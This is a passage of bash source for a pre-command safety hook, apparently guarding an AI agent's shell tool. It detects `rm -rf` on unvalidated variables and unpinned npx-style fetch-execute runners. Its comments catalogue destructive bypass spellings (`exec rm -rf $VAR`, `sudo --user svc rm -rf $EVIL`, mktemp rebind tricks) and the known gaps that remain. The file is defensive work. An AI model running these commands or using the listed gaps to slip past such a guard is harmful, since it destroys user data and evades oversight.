# loops via s8_strip_wrappers, and parity-tested against the curl-sh CURLSH_WRAP
# regex — 2026-07-15 seam consolidation). ARGLESS = transparent exec-wrappers that
# take no option before the command (env rm, command rm). FLAGGED = wrappers that
# carry option/duration tokens first (timeout 5 rm, sudo -E rm, nice -n10 rm).
# Bash 3.2: indexed arrays only. Shell keywords (do/then/else/!) and path-form env
# are handled inline at each gate — not exec-wrappers, and curl-sh (a pipe SINK,
# never a control structure) does not share them.
#
# F23/F24 (2026-07-25 deep audit): `exec` was absent — it replaces the shell with
# the named command, exactly as transparent as env/command/nohup, so `exec rm -rf
# $VAR` bypassed all three gates. And the ARGLESS/FLAGGED split was wrong about
# what "argless" means: env/command/time DO take options (`env -i`, `env -u NAME`,
# `command -p`, `time -p`), and the strip loop stopped at the first `-flag`, so the
# real command word was never reached. Both lists now consume leading option tokens;
# only the bare-numeric DURATION consumption stays FLAGGED-only (`timeout 5 rm`).
S8_WRAP_ARGLESS=(env command exec nohup setsid time busybox)
S8_WRAP_FLAGGED=(timeout nice stdbuf ionice chrt sudo doas)

# s8_in_list WORD ELEM... → returns 0 if WORD equals any ELEM.
s8_in_list() {
  local w="$1"; shift
  local e
  for e in "$@"; do [[ "$w" == "$e" ]] && return 0; done
  return 1
}

# s8_wrap_optarg WRAPPER FLAG → 0 when FLAG consumes the FOLLOWING token as its
# argument for WRAPPER. Without this the argument itself lands at command position
# and ends the strip (`env -u FOO rm …` stopped on `FOO`), which is a false NEGATIVE
# on a real spelling. Scoped per-wrapper on purpose: `-i` takes an argument for
# stdbuf but not for env, so a flat flag list would over-consume and swallow the
# command word — that direction creates misses, so entries are deliberately few and
# only cover flags whose argument is separated by a space. Glued (`-uFOO`) and
# `--flag=value` forms carry their own argument and are consumed by the generic
# `-*` arm. Closing `timeout -s KILL 5` / `sudo -u svc` here also retires the two
# option-with-arg residuals the strip header documented.
# F29 (2026-07-27 audit): the SEPARATED long forms are listed alongside the short
# ones. The table had short flags only, so `sudo --user svc rm -rf $EVIL` — the
# spelling every getopt_long tool accepts — had `--user` consumed by the generic
# `-*` arm, then broke the strip loop on the bare word `svc`, and the command word
# was never reached. Glued `--user=svc` needs no entry: it carries its own
# argument and the generic arm handles it. Entries stay narrow (only flags whose
# argument is genuinely separate) because over-consuming eats the command word.
s8_wrap_optarg() {
  case "$1" in
    env)     [[ "$2" == '-u' || "$2" == '-S' || "$2" == '-C' || "$2" == '--unset' || "$2" == '--split-string' || "$2" == '--chdir' ]] ;;
    exec)    [[ "$2" == '-a' ]] ;;
    time)    [[ "$2" == '-o' || "$2" == '-f' || "$2" == '--output' || "$2" == '--format' ]] ;;
    timeout) [[ "$2" == '-s' || "$2" == '-k' || "$2" == '--signal' || "$2" == '--kill-after' ]] ;;
    stdbuf)  [[ "$2" == '-i' || "$2" == '-o' || "$2" == '-e' || "$2" == '--input' || "$2" == '--output' || "$2" == '--error' ]] ;;
    # Short and long spellings are listed in PAIRS. F29 added the long forms
    # only, which closed the spelling a script generates and left the one a human
    # types (`sudo -p` vs `sudo --prompt`) — caught by the v0.62.0 pre-tag review.
    sudo)    [[ "$2" == '-u' || "$2" == '-g' || "$2" == '-U' || "$2" == '-C' \
              || "$2" == '-p' || "$2" == '-D' || "$2" == '-r' || "$2" == '-t' || "$2" == '-h' \
              || "$2" == '--user' || "$2" == '--group' || "$2" == '--other-user' \
              || "$2" == '--close-from' || "$2" == '--prompt' || "$2" == '--chdir' \
              || "$2" == '--role' || "$2" == '--type' || "$2" == '--host' ]] ;;
    doas)    [[ "$2" == '-u' || "$2" == '-C' ]] ;;
    *)       return 1 ;;
  esac
}

# s8_split_segments CMD → split on command terminators, one segment per line.
# Byte-identical to the rm/npx gates' formerly-inline split. `&&`/`||` collapse
# first (multi-char), then single-char `; & | ( ) backtick`. NOT used by the
# curl-sh gate (which needs a pipe-continuation join and must keep `|` joins).
s8_split_segments() {
  # F28: protect a `&` that belongs to a REDIRECTION operator (`3>&1`, `2>&1`,
  # `<&-`) before the char-class split, then restore it. Without this the split
  # cut `3>&1 rm -rf $VAR` into `3>` + `1 rm -rf $VAR`, so the segment handed to
  # each gate began at `1` and the command word was never examined — the same
  # blind spot F25 closed for `>/tmp/log`, reached by a different route. A real
  # background `&` has no `<`/`>` before it and still splits.
  local SEP=$'\001'
  printf '%s\n' "$1" \
    | sed -E "s/([<>])&([0-9-])/\1${SEP}\2/g" \
    | sed -E 's/&&/\n/g; s/\|\|/\n/g' \
    | sed -E 's/[;&|()`]/\n/g' \
    | sed -E "s/${SEP}/\&/g"
}

# s8_strip_wrappers SEGMENT → SEGMENT minus leading env-assignments and transparent
# exec-wrappers, stopped at the first command word. Single source for the rm and npx
# gates (were two hand-copied loops). Covers: `FOO=bar` assignments; ARGLESS wrappers;
# shell keywords do/then/else/! (segments split on `;`, so `if …; then rm …` lands the
# keyword at segment head); path-form env; FLAGGED wrappers with their option/bare-
# numeric-duration args consumed. Stripping only ever removes a prefix, so a non-rm/
# non-runner command behind a wrapper is unaffected (the gate still no-ops on it).
# Residual (documented, unchanged): `xargs rm` (target on stdin). Option-with-arg
# wrapper forms (`sudo -u svc rm`, `timeout -s KILL 5 rm`) were residuals until F24
# added s8_wrap_optarg. [allow-*] is the escape.
# CALL-SITE ORDER IS LOAD-BEARING: rm calls this BEFORE its `${x#[({]}` opener-strip,
# npx calls it AFTER — that difference makes `{ env rm` a (latent) miss and `{ env npx`
# a catch. Both behaviours predate this extraction and must be preserved; the
# differential corpus scan proves no verdict moved.
s8_strip_wrappers() {
  local seg="$1" first w rest wrap durations
  while [[ -n "$seg" ]]; do
    first="${seg%%[[:space:]]*}"
    # F25: a redirection may precede the command word (`>/tmp/log rm -rf $VAR`,
    # `2>/dev/null rm …`) — bash accepts it there, and leaving it in place made
    # the redirection itself the "command word", blinding all three gates. A token
    # that is PURELY a redirection operator (`>`, `2>`, `>>`) also consumes the
    # following filename token; an operator with the target glued on (`>/tmp/log`,
    # `2>&1`) consumes only itself.
    if [[ "$first" =~ ^[0-9]*(\<|\>)(\>|\&)?[^[:space:]]*$ ]]; then
      rest="${seg#"$first"}"; seg="${rest#"${rest%%[![:space:]]*}"}"
      if [[ "$first" =~ ^[0-9]*(\<|\>)(\>|\&)?$ ]]; then
        w="${seg%%[[:space:]]*}"
        rest="${seg#"$w"}"; seg="${rest#"${rest%%[![:space:]]*}"}"
      fi
      continue
    fi
    if [[ "$first" =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] \
       || [[ "$first" == 'do' || "$first" == 'then' || "$first" == 'else' \
          || "$first" == '!' \
          || "$first" == /usr/bin/env || "$first" == /bin/env ]]; then
      rest="${seg#"$first"}"; seg="${rest#"${rest%%[![:space:]]*}"}"
      continue
    fi
    if s8_in_list "$first" "${S8_WRAP_ARGLESS[@]}"; then
      wrap="$first"; durations=0
    elif s8_in_list "$first" "${S8_WRAP_FLAGGED[@]}"; then
      wrap="$first"; durations=1
    else
      break
    fi
    rest="${seg#"$first"}"; seg="${rest#"${rest%%[![:space:]]*}"}"
    # Consume this wrapper's own option tokens. Both classes take options (F24);
    # only FLAGGED wrappers additionally take a bare numeric duration (`timeout 5`).
    while [[ -n "$seg" ]]; do
      w="${seg%%[[:space:]]*}"
      if [[ "$w" == -* ]]; then
        rest="${seg#"$w"}"; seg="${rest#"${rest%%[![:space:]]*}"}"
        if s8_wrap_optarg "$wrap" "$w"; then
          w="${seg%%[[:space:]]*}"
          rest="${seg#"$w"}"; seg="${rest#"${rest%%[![:space:]]*}"}"
        fi
      elif (( durations == 1 )) && [[ "$w" =~ ^[0-9]+[smhd]?$ ]]; then
        rest="${seg#"$w"}"; seg="${rest#"${rest%%[![:space:]]*}"}"
      else break; fi
    done
  done
  printf '%s' "$seg"
}

declare -a HITS=()
# v0.23.6 — parallel to HITS: the granular §8 section each hit belongs to, so
# the deny telemetry can be filed under §8-rm-rf-var / §8-npx instead of the
# generic §8 bucket. Pre-fix all denies were recorded under §8 while bypass
# tokens / auto-allows were recorded granular, making the doctor's per-section
# bypass ratio read a misleading 100% for §8-npx / §8-rm-rf-var (denies sat in
# a different bucket from the denominator). Enforcement is unchanged.
declare -a HIT_SECTIONS=()
REASONS=""

# Pattern 1: rm with `-r` / `-R` / `-f` / `-F` / `--recursive` / `--force`
# in its flag block AND a variable-expansion target.
#
# Per-segment iteration (v0.21.4): split SANITIZED_CMD_FLAT on command
# terminators (`;`, `&&`, `||`, `|`, `&`) and analyze each `rm`-starting
# segment independently. Pre-fix `.*${RM_FLAG_REGEX}//` was a greedy sed
# anchored at the LAST `rm -rf ` match; the earlier-segment in a chain
# was silently skipped. Repro: `rm -rf "$A" && : "${B:?msg}" && rm -rf "$B"`
# — last rm has a matching guard, accidentally allowing the unguarded `$A` rm.
# Per-segment iteration analyzes each rm independently.
#
# Long-form (`--recursive` / `--force`) and split short-form (`rm -v -i -rf`)
# flag patterns were also FN in the prior single-shot regex; the token loop
# below recognizes both shapes.
#
# Match against SANITIZED_CMD_FLAT (strings/comments/heredoc-bodies stripped)
# but accept the [allow-rm-rf-var] bypass token from raw CMD so the marker
# can live anywhere — including inside a quoted string the user wrote
# intentionally.
# Bypass telemetry carries its SUBJECT (2026-07-28). Every escape-hatch record in
# this hook used to be a bare `{"token":"…"}` — it said the hatch was used and
# not what it suppressed, so "should this gate keep its current shape?" was
# unanswerable from 3 months of data. The two sibling hooks already learned this
# (banned-vocab logs `matched`, memory-read-check logs `bypass_reason`); §8 is the
# one that never did. Lesson: feedback_bypass_telemetry_needs_the_term.
#
# What is recorded is deliberately NOT the command: a URL or an argument can carry
# a credential, and §8 forbids sensitive data in logs. Only the identifying token
# is kept — a variable NAME (never its value), a runner name, a rule slug — which
# is also exactly what the 30-day question needs ("what do people bypass FOR",
# not "against which host").
#
# The rm hatch fires BEFORE the detector runs (the whole detection block is
# skipped when it is set), so there is no verdict to name yet. What is recorded
# is therefore the candidate set — the `$VAR` names present in the command — and
# the field is named `vars` rather than `target` so it cannot be misread as the
# detector's finding. Capped at 5 to keep one row bounded (a full match list is
# how telemetry rows grow unbounded — see the audit multi-emit history).
bypass_rm=0
if echo "$CMD" | grep -qF '[allow-rm-rf-var]'; then
  bypass_rm=1
  _rm_vars=$(printf '%s' "$SANITIZED_CMD_FLAT" \
    | grep -oE '\$\{?[A-Za-z_][A-Za-z0-9_]*' | tr -d '${' | sort -u | head -5 | tr '\n' ',' | sed 's/,$//')
  hook_record pre-bash-safety bypass-escape-hatch \
    "{\"token\":\"allow-rm-rf-var\",\"vars\":$(printf '%s' "$_rm_vars" | jq -R .)}" \
    '§8-rm-rf-var' "$SESSION_ID" "$TOOL_USE_ID"
fi

if (( bypass_rm == 0 )); then
  # Split SANITIZED_CMD on terminators. Operators `&&` / `||` collapse to
  # newlines (multi-char first); then single-char `;` / `&` / `|`. Two passes
  # because sed -E alternation with backrefs is awkward for run-length groups.
  # Use SANITIZED_CMD (multi-line) not SANITIZED_CMD_FLAT — original newlines
  # ARE natural command terminators; the FLAT version collapses them, joining
  # otherwise-independent commands and breaking per-segment iteration.
  RM_SEGMENTS=$(s8_split_segments "$SANITIZED_CMD")
  while IFS= read -r segment; do
    # Trim leading/trailing whitespace.
    trimmed="${segment#"${segment%%[![:space:]]*}"}"
    trimmed="${trimmed%"${trimmed##*[![:space:]]}"}"
    # Strip leading env-var ASSIGNMENTS + transparent EXEC-WRAPPERS before the `rm`
    # check (shared s8_strip_wrappers — was an inline loop, single-sourced with the
    # npx gate 2026-07-15). `FOO=bar rm -rf $X`, `env rm`, `sudo -E rm`, `timeout 5 rm`,
    # `if …; then rm …` all reach the rm word after stripping; pre-fix each was a §8
    # SAFETY silent bypass (segment-start `rm` check skipped the whole segment). Order:
    # this runs BEFORE the `${trimmed#[({]}` opener-strip below — load-bearing, do not
    # reorder (see s8_strip_wrappers header). Residual (unchanged): `xargs rm`.
    # [allow-rm-rf-var] escapes.
    trimmed=$(s8_strip_wrappers "$trimmed")
    # Segment must start with an `rm` token. Canonicalize the command word to
    # its basename and strip a leading backslash so path-prefixed (`/bin/rm`,
    # `./rm`) and alias-defeating (`\rm`) forms are recognized as rm — matching
    # what the shell EXECS, not the source spelling (v0.39.0 §8 FN closure F1).
    # `busybox rm` (multiplexer) is handled earlier by the wrapper-strip loop.
    # Exact `== rm` after canonicalization keeps `charm`/`norm`/`perm` etc. off.
    # SEC-3 (2026-07-13): strip a leading group/subshell opener so `(rm`/`{ rm`
    # (command inside (...) / { ...; } / $(...)) is seen as rm.
    trimmed="${trimmed#[({]}"
    trimmed="${trimmed#"${trimmed%%[![:space:]]*}"}"
    rm_word="${trimmed%%[[:space:]]*}"
    rm_canon="${rm_word#\\}"; rm_canon="${rm_canon##*/}"
    [[ "$rm_canon" == rm ]] || continue
    # Parse args. Detect any of: -r / -R / -f / -F in a `-*[rRfF]*` short
    # flag block; OR `--recursive` / `--force` long form. Find the first
    # non-flag positional arg as the target. POSIX `--` separator handled.
    args_only="${trimmed#"$rm_word"}"
    args_only="${args_only#"${args_only%%[![:space:]]*}"}"
    # F22 (2026-07-25 deep audit) — collect EVERY positional target, not just the
    # first. `rm_target` was bound once under a `[[ -z … ]]` guard, so a variable
    # target in any later position was dropped: `rm -rf ./build $VAR`, `rm -rf
    # /tmp/a "$VAR"` and `: "${SAFE:?}" && rm -rf "$SAFE" "$EVIL"` all ALLOWed.
    # That is the plain unvalidated-$VAR class this gate exists for, in an ordinary
    # multi-target cleanup spelling. Each target is now analyzed independently
    # below, so a validated target no longer vouches for its neighbours.
    danger=0
    rm_targets=()
    after_dash_dash=0
    for tok in $args_only; do
      if (( after_dash_dash == 1 )); then
        rm_targets+=("$tok")
        continue
      fi
      case "$tok" in
        '--')              after_dash_dash=1 ;;
        --recursive|--force) danger=1 ;;
        --*)               ;;  # other long-flag, ignore
        -*[rRfF]*)         danger=1 ;;
        -*)                ;;  # short flag without r/R/f/F (e.g. -v -i)
        *)
          rm_targets+=("$tok")
          ;;
      esac
    done
    (( danger == 1 )) || continue
    (( ${#rm_targets[@]} > 0 )) || continue
    # One verdict per target. `continue` inside this loop means "next target";
    # every pre-F22 `continue` in the body already had exactly that meaning for
    # the single target it analyzed.
    for rm_target in "${rm_targets[@]}"; do
    echo "$rm_target" | grep -qE '\$[[:alpha:]_]|\$\{[^}]+\}' || continue
    varname=$(echo "$rm_target" | grep -oE '\$\{[^}]+\}|\$[[:alpha:]_][[:alnum:]_]*' | head -n1 \
      | sed -E 's/[${}"'"'"']//g')
    # Strip ALL var expansions + quotes from the target — what remains is the
    # literal-path residue. A whitelisted var (HOME/PWD/OLDPWD/TMPDIR) is only
    # "validated" when there's a real subpath bound: `$HOME/cache` rms a
    # subdir, but bare `$HOME` rms the user's entire home, and `$HOME/` rms
    # `/` if HOME is somehow empty (Steam-disaster class, ValveSoftware/
    # steam-for-linux#3671 — `rm -rf "$STEAM_ROOT/"*` with empty STEAM_ROOT).
    # The whitelist only certifies the var is shell-typed, not that the
    # target is bounded. Require ≥1 non-`/` character in the residue.
    residue=$(echo "$rm_target" | sed -E 's/\$\{[^}]+\}//g; s/\$[[:alpha:]_][[:alnum:]_]*//g; s/["'"'"']//g; s/[(){}]//g')
    case "$varname" in
      HOME|PWD|OLDPWD|TMPDIR)
        if [[ ! "$residue" =~ [^/] ]]; then
          HITS+=("rm -rf \$$varname with no literal subpath (bare whitelisted-var expansion)")
          HIT_SECTIONS+=('§8-rm-rf-var')
          REASONS+=$'\n  - rm -rf $'"$varname"$' with no subpath (whitelist permits $'"$varname"$'/sub, not bare $'"$varname"$')'
        fi
        ;;
      *)
        # Canonical-guard recognition: bash's `${VARNAME:?msg}` set-or-exit
        # operator forces the var to be set AND non-empty, or aborts the
        # shell. This is the exact form the deny message below recommends
        # ("Validate the var inline: : \"${VAR:?must be set}\""). Match
        # against the same varname extracted from the rm target so a guard
        # on a different var (e.g. `: "${SAFE:?msg}" && rm -rf "$EVIL"`)
        # still denies. Position-agnostic on purpose: if a user writes the
        # guard AFTER rm-rf, bash still executes rm-rf first, but with VAR
        # unset $VAR expands to empty → `rm -rf ""` is a no-op error, so
        # no damage is done either way. Other guard forms ([[ -n ]],
        # `set -u`, control flow) remain unrecognized — use [allow-rm-rf-var].
        # `(^|[^\\])` rejects backslash-escaped literals like
        # `echo "use \${X:?msg} guard"` — the `\$` is bash-literal, not
        # an actual expansion, so it must not satisfy the guard.
        # SEC-4 (2026-07-13): mktemp-provenance recognition — a var assigned in the
        # SAME command from $(mktemp …) / `mktemp …` is a validated rm target: mktemp
        # creates a fresh, uniquely-named path that cannot be / or a wildcard, so
        # cleaning it up is the §8.V4 disposal idiom, not an unvalidated-var danger.
        # Provenance recognition is limited to mktemp. Literal assignments
        # (`SP=/home/me/work; rm -rf "$SP"`) and transitive vars (`R="$S/x"`) stay
        # strict — use ${VAR:?} / a literal rm target / [allow-rm-rf-var].
        #
        # The literal case is a KNOWN FALSE-DENY and is deliberately not fixed:
        # `tasks/specs/s8-literal-provenance.md` (status: rejected) records the attempt.
        # A v0.48.0 candidate recognized unquoted literal assignments; an adversarial
        # review broke it five independent ways within one pass — prose injection into
        # the assignment scan (`echo " SP=/tmp/x $HOME"; rm -rf "$SP/build"`), fake
        # assignments manufactured by unwrap_indirect, indirect-name rebinds, `eval`
        # with a non-literal argument, and `trap 'SP=' DEBUG`. Root cause: the scan uses
        # TEXT position as a proxy for COMMAND position — the same error the npx gate was
        # rewritten to fix in v0.47.0 (B-1), one block below. Do not re-attempt without
        # real command-position parsing. `${VAR:?}` is the supported answer.
        #
        # v0.47.2 (2026-07-15) — the SEC-4 recognizer was a single grep for
        # `VAR=$(mktemp` ANYWHERE in the flat command. Three false-NEGATIVES, all
        # reaching the exact empty-var/subpath class this gate exists for
        # (ValveSoftware/steam-for-linux#3671, cited in the whitelist branch above):
        #   1. REASSIGNMENT — `S=$(mktemp -d); S=$EVIL; rm -rf "$S/build"` matched the
        #      first assignment and ALLOWed. $EVIL is env-supplied and invisible; if
        #      empty the rm becomes `rm -rf /build`. Control (`rm -rf "$EVIL/build"`
        #      with no mktemp mention) correctly denied — the stray mktemp opened it.
        #   2. POSITION-BLINDNESS — `rm -rf "$S"; S=$(mktemp -d)` ALLOWed, but bash
        #      runs the rm FIRST, with $S still inherited from the environment. (The
        #      ${VAR:?} guard below is position-agnostic for a documented reason that
        #      does NOT transfer here: an unset var makes `rm -rf ""` a harmless
        #      no-op, whereas provenance is claiming the value is a known temp dir.)
        #   3. UNBOUNDED TARGET — `rm -rf "$S/$SUB"` ALLOWed on S's provenance while
        #      $SUB stayed unknown; empty $SUB collapses the target to the temp root.
        # Replaced by three conditions, all textual and all conservative:
        #   (1) >=1 assignment to varname strictly BEFORE this rm segment;
        #   (2) EVERY assignment to varname anywhere in the command is a mktemp one
        #       (position-blind on purpose — an assignment after the rm cannot make it
        #       safe, and refusing on one over-denies rather than under-allows);
        #   (3) the rm target expands no var other than varname.
        # Documented residual: `S=$( mktemp -d)` (space after the paren) now denies —
        # the RHS capture stops at the space. Deny-direction, use [allow-rm-rf-var].
        #
        # v0.47.3 REBIND GUARD. mktemp provenance rests on "VAR still holds the mktemp
        # path when the rm runs", which holds only if nothing else in the command rebinds
        # VAR. The `VAR=` scan cannot see most rebinds: probing found `unset SP`,
        # `SP+=$EVIL`, `printf -v SP`, `for SP in $EVIL`, `read SP`, `mapfile -t SP`, and
        # `declare -n r=SP; r=$EVIL` — each able to leave VAR empty and collapse
        # `rm -rf "$VAR/build"` into `rm -rf /build`, the steam-for-linux#3671 class.
        # `S=$(mktemp -d); unset S; rm -rf "$S/build"` ALLOWed on v0.46.0–v0.47.2.
        # Enumerating rebind SYNTAX is a denylist that cannot be completed, so invert it:
        # a rebind that spells the name must MENTION the name. Count occurrences of
        # varname in BARE position (not preceded by `$` / `${`) and require the count to
        # EQUAL the number of `VAR=` assignments actually classified below — a surplus is
        # a rebind the scan could not see. Reads (`$SP`, `${SP}`) do not count, so
        # `S=$(mktemp -d); mkdir -p "$S/a"; rm -rf "$S"` still passes; and multiple
        # assignments are fine because each one IS classified.
        #
        # KNOWN LIMIT (do not mistake this for completeness): the bare-count is an
        # allowlist on the SHAPE OF THE NAME, so an INDIRECT-name rebind defeats it —
        # `unset "$T"` / `printf -v "$T" ""` / `declare -n r=$T` never spell SP at all.
        # A 2026-07-15 adversarial review demonstrated this against a wider design built
        # on the same scan; those forms are not closed here. What IS closed is the
        # literal-name spelling of every such builtin, which is what real cleanup scripts
        # write. Treat provenance as a convenience for the §8.V4 disposal idiom, not as a
        # boundary against a crafted command — `DISABLE_*` and `[allow-rm-rf-var]` remain
        # bypassable by design (§8 is a guardrail, not an anti-injection boundary).
        #   - varname must be a clean identifier: it is interpolated into greps below,
        #     and a metacharacter-bearing extraction (`${SP:?}` yields `SP:?`) would
        #     otherwise make those patterns match the wrong thing.
        #   - `source` / `.` / `eval` execute code IN THE CURRENT SHELL that the scan
        #     cannot see, and can rebind without naming varname — reject outright.
        #     (`bash -c` / subshells cannot affect the parent.)
        #     Matched against NORMALIZED_CMD, i.e. BEFORE unwrap_indirect: unwrap rewrites
        #     `eval "$CODE"` into `; $CODE ;`, so by the time SANITIZED_CMD_FLAT exists the
        #     word `eval` is gone and a grep there never fires. (Caught by a corpus row;
        #     unwrap only ever exposes LITERAL inner text, so an opaque `eval "$CODE"`
        #     stays opaque.) Matching pre-sanitize means quoted prose mentioning `eval` /
        #     `source` also blocks provenance — FP-direction on an allow-path only, i.e.
        #     it falls back to the same deny the gate gives today.
        prov_safe=0
        prov_eligible=1
        [[ "$varname" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || prov_eligible=0
        # An IFS assignment re-splits an UNQUOTED target at runtime: with `IFS=/`,
        # `rm -rf $S` turns the temp path into relative words deleted from the cwd
        # (sandbox-confirmed, 2026-07-25 review). The gate cannot model shell word
        # splitting, so provenance is simply withdrawn whenever the command binds
        # IFS — deny-direction, and quoting the target is the fix.
        if (( prov_eligible == 1 )) \
           && printf '%s' "$SANITIZED_CMD_FLAT" | grep -qE '(^|[[:space:];&|`(])IFS\+?='; then
          prov_eligible=0
        fi
        if (( prov_eligible == 1 )) \
           && printf '%s' "$NORMALIZED_CMD" | grep -qE '(^|[[:space:];&|`(])(source|\.|eval)[[:space:]]'; then
          prov_eligible=0
        fi
        prov_prefix="${SANITIZED_CMD_FLAT%%"$segment"*}"
        if (( prov_eligible == 1 )) && printf '%s' "$prov_prefix" | grep -qE "(^|[[:space:];&|\`(])${varname}="; then
          prov_safe=1
          prov_nassign=0
          # (2) EVERY assignment to varname in the whole command must be a safe class.
          # No `continue` on an empty RHS: `VAR=` (empty value) must fall through to the
          # unsafe branch. v0.47.2 skipped blank lines here and thereby skipped genuine
          # empty assignments, so `SP=; rm -rf "$SP/build"` ALLOWed — the steam class F14
          # was written to close. Empty matches neither regex below, so it now denies.
          while IFS= read -r prov_rhs; do
            prov_nassign=$((prov_nassign + 1))
            # Optional leading double-quote (F20, 2026-07-25 audit): `bak="$(mktemp
            # …)"` is the QUOTING-CORRECT spelling of the same idiom and was the
            # top real false-deny shape in transcripts. The capture stops at the
            # first space, so only the `"$(mktemp` head is inspected — same as the
            # unquoted form.
            # shellcheck disable=SC2016  # single quotes intentional: literal regex, not expansion
            if printf '%s' "$prov_rhs" | grep -qE '^"?(\$\(|`)mktemp([[:space:]`)]|$)'; then
              continue
            fi
            # A temp-root LITERAL provenance class (`D=/tmp/job.1; rm -rf "$D"`,
            # the scratchpad-cleanup shape behind 86% of §8-rm-rf-var denies) was
            # BUILT AND REVERTED on 2026-07-25. Adversarial review broke it four
            # ways within one pass, three sandbox-confirmed deleting real dirs:
            #   1. backslash-escaped traversal — hook text `D=/tmp/\.\./\.\./etc`
            #      vs runtime `/etc`; the `..` check reads raw text (CRITICAL);
            #   2. `( D=/tmp/x ); rm -rf "$D"` / `false && D=…` / `true | D=…` —
            #      s8_split_segments splits on exactly the chars that create
            #      subshells and short-circuits, so an assignment that never binds
            #      the parent shell still lands at a "segment head";
            #   3. `rm -rf "$D/../.."` — provenance validates the VAR, never the
            #      literal residue appended to it;
            #   4. `IFS=/` word-splitting an unquoted target, and `$IFS` folding
            #      truncating the captured RHS to a PREFIX of the runtime value.
            # Root cause is the one `tasks/specs/s8-literal-provenance.md` already
            # records for the rejected v0.48.0 candidate: TEXT position is not
            # COMMAND position. The general invariant this class needs is that the
            # captured RHS EQUALS the runtime value — unreachable without a real
            # parser. Do not re-attempt from text scanning. The DX cost (scratch
            # cleanup denies) is tracked as an operator decision in
            # `tasks/audit-2026-07-25-deferred.md`; `${VAR:?}` and
            # [allow-rm-rf-var] remain the supported answers.
            prov_safe=0
            break
          done < <(printf '%s' "$SANITIZED_CMD_FLAT" \
            | grep -oE "(^|[[:space:];&|\`(])${varname}=[^[:space:];&|]*" \
            | sed -E "s/^[[:space:];&|\`(]+//; s/^${varname}=//")
          # (0b) REBIND GUARD, second half — bare mentions must be exactly the
          # assignments classified above. A surplus is `unset SP` / `SP+=…` /
          # `printf -v SP` / `for SP in …` / `read SP` / `mapfile -t SP` /
          # `declare -n r=SP` — a rebind the `VAR=` scan cannot see, after which the
          # value is no longer determinable from the command text.
          if (( prov_safe == 1 )); then
            # Adjacent `.` `/` `-` disqualify a mention (F20, 2026-07-25): no
            # rebind syntax puts those next to the NAME (shell identifiers
            # cannot contain them), but file paths do — a var named `bak` was
            # false-counted inside `cfg.bak.XXXXXX`, denying the quoted-mktemp
            # idiom it sat next to. `unset X` / `X+=` / `read X` / `r=X` all
            # still count.
            prov_bare=$(printf '%s' "$SANITIZED_CMD_FLAT" \
              | sed -E "s/\\\$\\{${varname}[^}]*\\}//g; s/\\\$${varname}([^A-Za-z0-9_]|\$)/\\1/g" \
              | grep -oE "(^|[^A-Za-z0-9_\$./-])${varname}([^A-Za-z0-9_./-]|\$)" | wc -l | tr -d ' ')
            [[ "$prov_bare" == "$prov_nassign" ]] || prov_safe=0
          fi
          # (3) NO argument of this rm may depend on a var other than varname.
          # Scanned over the FULL args tail, not just the first positional
          # (F20 hardening, 2026-07-25): `rm -rf "$D" "$EVIL"` rode along on
          # $D's provenance while $EVIL stayed unvalidated — the first-target
          # scan predates F20 and leaked through the mktemp class too.
          if (( prov_safe == 1 )); then
            prov_other=$(printf '%s' "$args_only" \
              | grep -oE '\$\{[^}]+\}|\$[[:alpha:]_][[:alnum:]_]*' \
              | sed -E 's/[${}"'"'"']//g' | grep -vxF "$varname" | head -n1)
            [[ -n "$prov_other" ]] && prov_safe=0
          fi
          # (4) the LITERAL residue appended to the provenance var must not
          # traverse out of it: `S=$(mktemp -d); rm -rf "$S/../../home/u/proj"`
          # rode on S's provenance while deleting outside the temp dir entirely
          # (2026-07-25 adversarial review, sandbox-confirmed). Provenance
          # certifies where the var POINTS, not where a `..` walk from it lands.
          case "/$rm_target/" in
            */../*|*'..'*) prov_safe=0 ;;
          esac
        fi
        if (( prov_safe == 1 )); then
          hook_record pre-bash-safety rm-rf-allow-provenance "{\"var\":\"$varname\"}" '§8-rm-rf-var' "$SESSION_ID" "$TOOL_USE_ID"
        else
          guard_re='(^|[^\\])\$\{'"$varname"':\?'
          if echo "$SANITIZED_CMD_FLAT" | grep -qE "$guard_re"; then
            hook_record pre-bash-safety rm-rf-allow-validated "{\"var\":\"$varname\"}" '§8-rm-rf-var' "$SESSION_ID" "$TOOL_USE_ID"
          else
            HITS+=("rm -rf \$$varname (unvalidated variable expansion)")
            HIT_SECTIONS+=('§8-rm-rf-var')
            REASONS+=$'\n  - rm -rf with unvalidated $'"$varname"
          fi
        fi
        ;;
    esac
    done  # F22 per-target loop
  done <<< "$RM_SEGMENTS"
fi

# Pattern 2: fetch-execute package runner (npx / npm exec / pnpm dlx / yarn dlx
# / bunx) with first non-flag arg being a bare/scoped package name without
# @<version> pin. §8 forbids "execute scripts of unknown origin"; npx's siblings
# fetch+run an unpinned unknown package identically (npx is literally a shortcut
# for `npm exec`), so the §8 NPX gate (lockfile → local → pinned) applies to the
# whole family. `npm install` / `npm run` / `pnpm install` / `yarn add` are NOT
# fetch-execute one-offs and stay excluded (the regex requires the `exec`/`dlx`
# subcommand). 2026-07-03 §8 false-negative audit + code review found the
# siblings bypassed the npx-only detector; local/lockfile resolution below
# already reads pnpm-lock.yaml / yarn.lock, so the gate is symmetric across
# ecosystems.
# B-1 (2026-07-13): find a runner at COMMAND POSITION, not anywhere. Split into
# command segments (same boundaries as the rm gate), strip leading env-assignments
# + transparent wrappers (env/command/sudo/timeout/… — mirrors the rm gate), then
# check if the segment's command word is a runner. A runner name sitting inside a
# quoted argument (`git commit -m "add npx setup for $X"`) is NOT at a segment's
# command position, so prose no longer false-denies; `env npx` / `$(npx …)` still do.
# F26 (2026-07-25 deep audit): the two-word runners anchored tool and subcommand as
# adjacent, so a global flag between them (`npm --yes exec pkg`, `pnpm --silent dlx
# pkg` — both accepted by the real package managers) fell out of the gate. Only
# `-flag` tokens may sit in the gap: a bare word there is a different subcommand
# (`npm run exec-tests`) and must stay out.
# F30 (2026-07-27 audit): a flag may carry a SEPARATED argument. F26 admitted
# `-flag` tokens only, so `npm --prefix ./pkgs exec <pkg>` / `yarn --cwd x dlx
# <pkg>` — ordinary monorepo spellings — failed the regex outright and the
# unpinned fetch-execute was never examined. A bare word is admitted ONLY
# directly after a flag (its argument); one standing alone is still a different
# subcommand and must keep `npm run exec-tests` out of the gate.
NPX_GLOBAL_FLAGS='([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*'
# F40 (2026-07-28): `bun x` — the SPACED spelling of `bunx`. Measured: `bunx
# some-unknown-pkg` denied and `bun x some-unknown-pkg` did not. Same tool, same
